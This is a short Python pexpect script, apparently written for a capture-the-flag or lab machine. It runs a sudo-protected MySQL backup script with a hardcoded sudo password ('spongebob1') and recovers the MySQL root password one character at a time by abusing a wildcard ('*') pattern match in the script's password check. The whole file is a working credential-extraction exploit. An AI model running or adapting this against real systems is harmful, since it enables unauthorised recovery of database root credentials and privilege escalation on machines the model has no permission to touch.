import string
import pexpect


char_set = string.ascii_letters + string.digits

child = pexpect.spawn('sudo /opt/scripts/mysql-backup.sh')
child.expect('^.*password.*$')
child.sendline('spongebob1')

print("starting")

def check_verification(passwd):
    child = pexpect.spawn('sudo /opt/scripts/mysql-backup.sh')
    child.expect('^.*password.*$')
    child.sendline('spongebob1')

    child.expect('Enter MySQL password for root: ')
    child.sendline(passwd)
    res = child.expect(['^.*failed.*$','^.*confirmed.*$'])
    return res

cont = 'true'
pw = ''
while(cont == 'true'):
    for i in range(len(char_set)):
        test = pw + char_set[i] + '*'
        res = check_verification(test)
        if(res == 0):
            cont = 'false'
            continue
        else:
            pw = pw + char_set[i]
            print(pw)
            cont = 'true'
            break  